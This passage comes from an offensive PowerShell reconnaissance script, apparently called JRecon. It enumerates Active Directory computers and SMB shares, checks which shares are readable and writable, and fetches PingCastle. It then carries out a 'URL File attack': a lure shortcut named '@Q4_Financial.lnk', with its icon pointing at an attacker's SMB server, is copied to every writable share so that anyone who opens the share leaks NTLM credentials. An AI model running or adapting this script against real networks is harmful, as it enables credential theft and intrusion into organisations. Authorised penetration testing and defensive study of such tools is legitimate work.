        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)




    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }



    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()

    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)



    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


function Test-Server {
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [String] 
        $Server,
        
        [Switch]
        $RPC
    )
    
    if ($RPC){
        $WMIParameters = @{
                        namespace = 'root\cimv2'
                        Class = 'win32_ComputerSystem'
                        ComputerName = $Name
                        ErrorAction = 'Stop'
                      }
        if ($Credential -ne $null)
        {
            $WMIParameters.Credential = $Credential
        }
        try
        {
            Get-WmiObject @WMIParameters
        }
        catch { 
            Write-Verbose -Message 'Could not connect via WMI'
        } 
    }

    else{
        Test-Connection -ComputerName $Server -count 1 -Quiet
    }
}


function Get-ShuffledArray {

    [CmdletBinding()]
    param( 
        [Array]$Array 
    )
    Begin{}
    Process{
        $len = $Array.Length
        while($len){
            $i = Get-Random ($len --)
            $tmp = $Array[$len]
            $Array[$len] = $Array[$i]
            $Array[$i] = $tmp
        }
        $Array;
    }
}


function Get-NetCurrentUser {
    
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}


function Get-NetDomain {
    
    [CmdletBinding()]
    param(
        [Switch]
        $Base
    )
    

    if ($Base){
        $temp = [string] ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
        $parts = $temp.split('.')
        $parts[0..($parts.length-2)] -join '.'
    }
    else{
        ([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.'
    }
}


function Get-NetComputers {
    
    [CmdletBinding()]
    Param (
        [string]
        $HostName = '*',

        [string]
        $SPN = '*',

        [string]
        $OperatingSystem = '*',

        [string]
        $ServicePack = '*',

        [Switch]
        $FullData,

        [string]
        $Domain
    )


    if ($Domain){


        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {

            $dn = "DC=$($Domain.Replace('.', ',DC='))"


            if($PrimaryDC){
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{

                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }


            if ($ServicePack -ne '*'){
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
            }
            else{

                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
            }
            
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{

        if ($ServicePack -ne '*'){
            $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)(servicePrincipalName=$SPN))"
        }
        else{

            $CompSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(servicePrincipalName=$SPN))"
        }
    }
    
    if ($CompSearcher){
        

        $CompSearcher.PageSize = 200
        
        $CompSearcher.FindAll() | ForEach-Object {

            if ($FullData){
                $_.properties
            }
            else{

                $_.properties.dnshostname
            }
        }
    }
}


function Get-NetShare {
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    

    $QueryLevel = 1
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0


    $Result = $Netapi32::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)


    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetShare result: $Result"
    

    if (($Result -eq 0) -and ($offset -gt 0)) {
        

        $Increment = $SHARE_INFO_1::GetSize()
        

        for ($i = 0; ($i -lt $EntriesRead); $i++){


            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $SHARE_INFO_1

            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }

        $Netapi32::NetApiBufferFree($ptrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Outvoke-ShareFinder {
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $Ping,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    

    [String[]] $excludedShares = @('')
    
    if ($ExcludePrint){
        $excludedShares = $excludedShares + "PRINT$"
    }
    if ($ExcludeIPC){
        $excludedShares = $excludedShares + "IPC$"
    }
    if ($ExcludeStandard){
        $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
    }
    

    $randNo = New-Object System.Random
    

    $CurrentUser = Get-NetCurrentUser
    

    if($Domain){
        $targetDomain = $Domain
    }
    else{

        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running ShareFinder on domain $targetDomain with delay of $Delay"
    $servers = @()


    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{

        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }
    

    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{
        

        $counter = 0
        
        foreach ($server in $servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            if ($server -ne ''){

                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                

                $up = $true
                if(-not $NoPing){
                    $up = Test-Server -Server $server
                }
                if($up){

                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname


                        if (($netname) -and ($netname.trim() -ne '')){
                            

                            if($CheckAdmin){
                                if($netname.ToUpper() -eq "ADMIN$"){
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$server\$netname"
                                    }
                                    catch {}
                                }
                            }
                            

                            elseif ($excludedShares -notcontains $netname.ToUpper()){

                                if($CheckShareAccess){

                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$server\$netname"
                                    }
                                    catch {}
                                }
                                else{
                                    "\\$server\$netname"
                                }
                            } 
                            
                        }
                        
                    }
                }
                
            }
            
        }
    }
}


function Outvoke-ShareFinderThreaded {
        
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string[]]
        $ExcludedShares = @(),

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [String]
        $Domain,

        [Int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    

    $CurrentUser = Get-NetCurrentUser
    

    if($Domain){
        $targetDomain = $Domain
    }
    else{

        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running Outvoke-ShareFinderThreaded on domain $targetDomain with delay of $Delay"
    $servers = @()


    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{

        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }
    

    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }



    $EnumServerBlock = {
        param($Server, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)


        $up = $true
        if($Ping){
            $up = Test-Server -Server $Server
        }
        if($up){

            $shares = Get-NetShare -HostName $Server
            foreach ($share in $shares) {
                Write-Debug "[*] Server share: $share"
                $netname = $share.shi1_netname
                $remark = $share.shi1_remark
                $path = '\\'+$server+'\'+$netname


                if (($netname) -and ($netname.trim() -ne '')){

                    if($CheckAdmin){
                        if($netname.ToUpper() -eq "ADMIN$"){
                            try{
                                $f=[IO.Directory]::GetFiles($path)
                                "\\$server\$netname"
                            }
                            catch {}
                        }
                    }

                    elseif ($excludedShares -notcontains $netname.ToUpper()){

                        if($CheckShareAccess){

                            try{
                                $f=[IO.Directory]::GetFiles($path)
                                "\\$server\$netname"
                            }
                            catch {}
                        }
                        else{
                            "\\$server\$netname"
                        }
                    } 
                }
            }
        }
    }



    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 

    $MyVars = Get-Variable -Scope 1
 

    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 

    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }


    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 



    $counter = 0


    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."

    foreach ($server in $servers){
        

        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    

            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool


            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares).AddParameter('CheckAdmin', $CheckAdmin)
    

            $jobs += $ps[$counter].BeginInvoke();
     

            $wait += $jobs[$counter].AsyncWaitHandle

        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 


    for ($y = 0; $y -lt $counter; $y++) {     

        try {   

            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}

$Mod = New-InMemoryModule -ModuleName Win32


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr]))
)


$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}


$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']

Function Get-SubnetAddresses {
Param ([IPAddress]$IP,[ValidateRange(0, 32)][int]$maskbits)


  $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
  $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
  $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')
  

  $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )



  $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
  [IPAddress]$upper = (0..3 | %{$LowerBytes[$_] + ($maskbytes[(3-$_)] -bxor 255)}) -join '.'


  Return [pscustomobject][ordered]@{
    Lower=$lower
    Upper=$upper
  }
}

Function Get-IPRange {
param (
  [Parameter(Mandatory=$true,ValueFromPipelineByPropertyName)][IPAddress]$lower,
  [Parameter(Mandatory=$true,ValueFromPipelineByPropertyName)][IPAddress]$upper
)

  $IPList = [Collections.ArrayList]::new()
  $null = $IPList.Add($lower)
  $i = $lower


  while ( $i -ne $upper ) { 

    $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
    [Array]::Reverse($iBytes)


    $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes,0) +1))
    [Array]::Reverse($nextBytes)


    $i = [IPAddress]$nextBytes
    $null = $IPList.Add($i)
  }

  return $IPList
}

if($jshareask) {Write-Host "Skipping Shares Enumeration..." -ForegroundColor Yellow;}

else{
	if($jpingquest){
		echo ""
		Write-Host "Checking for accessible shares... " -ForegroundColor Cyan;
		Write-Host "This may take long, depending on the size of the network..." -ForegroundColor Yellow;

		if ($jrange)
		{
			$jrangesplit = $jrange.Split(',')

			$jrangesplit | Foreach-Object{

			$jnetwork = $_.Split('/')[-2]

			$jcidr = $_.Split('/')[-1]

			$jnet = $jnetwork.replace(".","")

			Get-SubnetAddresses $jnetwork $jcidr | Get-IPRange | Select -ExpandProperty IPAddressToString > "${jnetwork}_IPs_inscope.txt"

			Outvoke-ShareFinder -Ping -CheckShareAccess -ExcludeStandard -ExcludePrint -ExcludeIPC -HostList .\${jnetwork}_IPs_inscope.txt >> ${jnetwork}_Shares_Accessible.txt

			type ${jnetwork}_Shares_Accessible.txt

			type ${jnetwork}_Shares_Accessible.txt >> Shares_Accessible.txt

			del ${jnetwork}_Shares_Accessible.txt

			del ${jnetwork}_IPs_inscope.txt

			echo ""

			}
		}

		else{

			Import-csv .\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select -ExpandProperty Name | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() } | Out-File -encoding ascii hosts.txt -NoNewline

			Outvoke-ShareFinder -Ping -CheckShareAccess -ExcludeStandard -ExcludePrint -ExcludeIPC -HostList .\hosts.txt > .\Shares_Accessible.txt

			type .\Shares_Accessible.txt

			del .\hosts.txt
		}
		 
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}
	
	else{
		echo ""
		Write-Host "Checking for accessible shares using PingCastle... " -ForegroundColor Cyan;
		if($jPingCastle){
			if(Test-Path -Path $pwd\PingCastle\PingCastle.exe){}
			else{
				Invoke-WebRequest -Uri $jpingdownload -OutFile "$pwd\PingCastle.zip"

				Add-Type -AssemblyName System.IO.Compression.FileSystem
				function Unzip
				{
						param([string]$zipfile, [string]$outpath)

						[System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
				}

				Unzip "$pwd\PingCastle.zip" "$pwd\PingCastle\"
			}
			.\PingCastle\PingCastle.exe --scanner share --server $jcurrentdomain
			$jpingshares = get-content $pwd\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
			$jpingshares2 = $jpingshares -replace "True",""
			$jpingshares3 = $jpingshares2 -replace "False",""
			$jpingshares4 = $jpingshares3.Trim()
			$jpingshares5 = $jpingshares4 -replace "\s","\"
			$jpingshares5 > Shares_Accessible.txt
			type $pwd\Shares_Accessible.txt
			del $pwd\ad_scanner_share*
			del .\PingCastle.zip
		}

		else{
			.\PingCastle\PingCastle.exe --scanner share --server $jcurrentdomain
			$jpingshares = get-content $pwd\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
			$jpingshares2 = $jpingshares -replace "True",""
			$jpingshares3 = $jpingshares2 -replace "False",""
			$jpingshares4 = $jpingshares3.Trim()
			$jpingshares5 = $jpingshares4 -replace "\s","\"
			$jpingshares5 > Shares_Accessible.txt
			type $pwd\Shares_Accessible.txt
			del $pwd\ad_scanner_share*
		}
	}
}

if($jwritejwrite){Write-Host "Skipping Writable Shares Enumeration..." -ForegroundColor Yellow;}
else{
	echo ""
	Write-Host "Checking for writable shares..." -ForegroundColor Cyan;
	
	function Test-Write {
                [CmdletBinding()]
                param (
                        [parameter()] [ValidateScript({[IO.Directory]::Exists($_.FullName)})]
                        [IO.DirectoryInfo] $Path
                )
                try {
                        $testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
                        [IO.File]::Create($testPath, 1, 'DeleteOnClose') > $null
                        return "$Path"
                } finally {
                        Remove-Item $testPath -ErrorAction SilentlyContinue
                }
	}
        
    Set ErrorActionPreference Silentlycontinue
    Get-Content .\Shares_Accessible.txt | ForEach-Object {Test-Write $_ -ea silentlycontinue >> .\Shares_Writable2.txt}
    type Shares_Writable2.txt | Get-Unique > Shares_Writable.txt
	del .\Shares_Writable2.txt
	type Shares_Writable.txt
    echo ""
    Write-Host "Done! " -ForegroundColor Green;
}

$ErrorActionPreference = "SilentlyContinue"

if($jfileattack) {
	Write-Host "Skipping URL File attack..." -ForegroundColor Yellow;
	if($jfileclean) {
		Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow;
	}

	else{
		if($jsmbfilename){
			$jtestwritableshares = Get-Content .\Shares_Writable.txt
			if($jtestwritableshares){
				echo ""
				Write-Host "Cleaning after a previous URL File attack..." -ForegroundColor Cyan;
				Get-Content .\Shares_Writable.txt | ForEach-Object {del $_\@$jsmbfilename.lnk}
				Write-Host "Done!" -ForegroundColor Green;
			}
			else{
			Write-Host "Looks like there are no writable shares listed within Shares_Writable.txt" -ForegroundColor Red;
			Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow;
			}
		}
		else{
			$jtestwritableshares = Get-Content .\Shares_Writable.txt
			if($jtestwritableshares){
				if($jsmbfilenameclean) {}
				else{$jsmbfilenameclean = "Q4_Financial"}
				echo ""
				Write-Host "Cleaning after a previous URL File attack..." -ForegroundColor Cyan;
				Get-Content .\Shares_Writable.txt | ForEach-Object {del $_\@$jsmbfilenameclean.lnk}
				Write-Host "Done!" -ForegroundColor Green;
                                echo " "
			}
			else{
				Write-Host "Looks like there are no writable shares listed within Shares_Writable.txt" -ForegroundColor Red;
				Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow;
			}
		}
	}
}

else{
	if($jsmbfilename) {}
	else {$jsmbfilename = "Q4_Financial"}
	$jtestwritableshares = Get-Content .\Shares_Writable.txt
	if($jtestwritableshares){
		echo ""
		Write-Host "URL File Attack in progress..." -ForegroundColor Cyan;
		Write-Host "Don't forget to clean after yourself once you are done with this attack..." -ForegroundColor Red;
		Write-Host "To do so, re-run JRecon but don't run this attack" -ForegroundColor Yellow;
		$jwsh = new-object -ComObject wscript.shell
		$jshortcut = $jwsh.CreateShortcut("$pwd\@$jsmbfilename.lnk")
		$jshortcut.IconLocation = "\\$jsmbserverip\test.ico"
		$jshortcut.Save()
		Get-Content .\Shares_Writable.txt | ForEach-Object {cp "@$jsmbfilename.lnk" $_\@$jsmbfilename.lnk}
		del .\@$jsmbfilename.lnk
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	else{
		Write-Host "Looks like there are no writable shares listed within Shares_Writable.txt" -ForegroundColor Red;
		Write-Host "Skipping URL File attack..." -ForegroundColor Yellow;
	}
}

echo " "
Write-Host "Arrivederci !!" -ForegroundColor Cyan;
echo " "